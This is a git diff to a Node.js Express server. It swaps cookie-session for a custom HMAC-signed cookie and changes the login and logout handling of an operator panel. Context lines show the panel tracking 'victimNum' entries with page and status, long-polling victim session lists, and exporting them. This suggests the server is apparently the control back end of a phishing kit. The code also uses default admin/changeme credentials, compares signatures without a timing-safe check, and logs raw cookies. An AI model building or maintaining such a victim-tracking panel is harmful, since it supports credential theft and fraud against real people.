@@ -2,63 +2,123 @@
 const express = require('express');
 const cors    = require('cors');
 const crypto  = require('crypto');
-const session = require('cookie-session');
 
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
+const COOKIE_NAME    = 'pan_sess_v2'; // Changed name to avoid conflicts
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS });
+console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });
 
 /* ----------  SIMPLE EVENT BUS  ---------- */
 const events = new (require('events')).EventEmitter();
 function emitPanelUpdate() { events.emit('panel'); }
 
-/* ----------  CRITICAL: TRUST PROXY MUST BE FIRST ---------- */
-// Trust first proxy (Cloudflare, Railway, Render)
+/* ----------  TRUST PROXY ---------- */
 app.set('trust proxy', 1);
 
-/* ----------  PROTOCOL OVERRIDE FOR CLOUDFLARE ---------- */
-// Must be BEFORE session middleware
+/* ----------  CUSTOM SESSION MIDDLEWARE (REPLACES cookie-session) ---------- */
+// Simple signed cookie implementation that actually works with Cloudflare
+function signCookie(value, secret) {
+  return crypto.createHmac('sha256', secret).update(value).digest('base64url');
+}
+
+function setSessionCookie(res, name, data, options = {}) {
+  const encoded = Buffer.from(JSON.stringify(data)).toString('base64url');
+  const signature = signCookie(encoded, SESSION_SECRET);
+  const value = `${encoded}.${signature}`;
+  
+  const defaults = {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'lax',
+    maxAge: 24 * 60 * 60 * 1000,
+    path: '/'
+  };
+  
+  const opts = { ...defaults, ...options };
+  res.cookie(name, value, opts);
+}
+
+function getSessionCookie(req, name) {
+  const cookie = req.cookies?.[name] || req.headers.cookie?.match(new RegExp(`${name}=([^;]+)`))?.[1];
+  if (!cookie) return null;
+  
+  try {
+    const [encoded, signature] = cookie.split('.');
+    if (!encoded || !signature) return null;
+    
+    // Verify signature
+    const expectedSig = signCookie(encoded, SESSION_SECRET);
+    if (signature !== expectedSig) {
+      console.log('[DEBUG] Cookie signature mismatch');
+      return null;
+    }
+    
+    return JSON.parse(Buffer.from(encoded, 'base64url').toString());
+  } catch (e) {
+    console.log('[DEBUG] Cookie parse error:', e.message);
+    return null;
+  }
+}
+
+function clearSessionCookie(res, name) {
+  res.clearCookie(name, { path: '/', httpOnly: true, secure: true, sameSite: 'lax' });
+}
+
+/* ----------  PROTOCOL & SESSION MIDDLEWARE ---------- */
 app.use((req, res, next) => {
-  // Cloudflare sets X-Forwarded-Proto header
   if (req.headers['x-forwarded-proto'] === 'https') {
     req.protocol = 'https';
     req.secure = true;
   }
-  // Debug logging - check Railway logs to verify this works
-  console.log(`[DEBUG] Protocol: ${req.protocol}, Secure: ${req.secure}, X-Forwarded-Proto: ${req.headers['x-forwarded-proto']}, Host: ${req.headers.host}, URL: ${req.url}`);
+  next();
+});
+
+// Parse cookies manually since we don't use cookie-parser
+app.use((req, res, next) => {
+  req.cookies = {};
+  if (req.headers.cookie) {
+    req.headers.cookie.split(';').forEach(cookie => {
+      const [name, ...rest] = cookie.trim().split('=');
+      if (name && rest.length > 0) {
+        req.cookies[name] = rest.join('=');
+      }
+    });
+  }
+  next();
+});
+
+// Session middleware
+app.use((req, res, next) => {
+  req.session = getSessionCookie(req, COOKIE_NAME) || {};
+  
+  // Debug logging
+  console.log(`[DEBUG] Host: ${req.headers.host}, URL: ${req.url}`);
+  console.log(`[DEBUG] Raw cookies: ${req.headers.cookie}`);
+  console.log(`[DEBUG] Parsed session: ${JSON.stringify(req.session)}`);
+  
+  // Session save method
+  req.session.save = () => {
+    setSessionCookie(res, COOKIE_NAME, req.session);
+  };
+  
+  // Session destroy method
+  req.session.destroy = () => {
+    clearSessionCookie(res, COOKIE_NAME);
+    req.session = {};
+  };
+  
   next();
 });
 
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-/* ----------  SESSION MIDDLEWARE - FIXED ---------- */
-const isProduction = process.env.NODE_ENV === 'production' || 
-                     process.env.RAILWAY_ENVIRONMENT === 'production' ||
-                     !!process.env.RAILWAY_STATIC_URL;
-
-app.use(session({
-  name: 'pan_sess',
-  keys: [SESSION_SECRET],
-  maxAge: 24 * 60 * 60 * 1000,
-  sameSite: 'lax',           // ✅ Fixed: 'lax' instead of 'none'
-  secure: isProduction,      // ✅ Fixed: true in prod, false locally
-  httpOnly: true
-  // No domain property - works universally on any domain
-}));
-
-// Debug: Log session status
-app.use((req, res, next) => {
-  console.log(`[DEBUG] Session: ${JSON.stringify(req.session)}, Cookies: ${req.headers.cookie}`);
-  next();
-});
 
 /* ----------  STATE  ---------- */
 const sessionsMap     = new Map();
@@ -79,26 +139,32 @@ app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html')
 
 /* ----------  PANEL ACCESS CONTROL  ---------- */
 app.get('/panel', (req, res) => {
-  console.log(`[DEBUG] /panel check - authed: ${req.session?.authed}, session: ${JSON.stringify(req.session)}`);
-  if (req.session?.authed === true) return res.sendFile(__dirname + '/_panel.html');
+  console.log(`[DEBUG] /panel check - authed: ${req.session?.authed}`);
+  if (req.session?.authed === true) {
+    return res.sendFile(__dirname + '/_panel.html');
+  }
   res.sendFile(__dirname + '/access.html');
 });
 
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
-  console.log(`[DEBUG] Login attempt - user: ${user}, session before: ${JSON.stringify(req.session)}`);
+  console.log(`[DEBUG] Login attempt - user: ${user}`);
   
   if (user === PANEL_USER && pw === PANEL_PASS) {
-    req.session.authed   = true;
+    req.session.authed = true;
     req.session.username = user;
-    console.log(`[DEBUG] Login success - session after: ${JSON.stringify(req.session)}`);
+    req.session.save(); // Explicitly save
+    console.log(`[DEBUG] Login success - session saved`);
     return res.redirect(302, '/panel');
   }
   res.redirect(302, '/panel?fail=1');
 });
 
 app.get('/panel/*', (req, res) => res.redirect(302, '/panel'));
-app.post('/panel/logout', (req, res) => { req.session = null; res.redirect('/panel'); });
+app.post('/panel/logout', (req, res) => { 
+  req.session.destroy(); 
+  res.redirect('/panel'); 
+});
 app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
@@ -321,7 +387,6 @@ app.get('/api/user', (req, res) => {
   res.status(401).json({ error: 'Not authenticated' });
 });
 
-// helper that builds the payload
 function buildPanelPayload() {
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
@@ -345,7 +410,6 @@ function buildPanelPayload() {
 app.get('/api/panel', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
-  // long-poll: wait up to 1 s for an event
   const listener = () => res.json(buildPanelPayload());
   events.once('panel', listener);
   setTimeout(() => {
@@ -417,6 +481,5 @@ app.get('/api/export', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   console.log(`Panel user: ${PANEL_USER}`);
-  console.log(`Environment: ${isProduction ? 'production' : 'development'}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
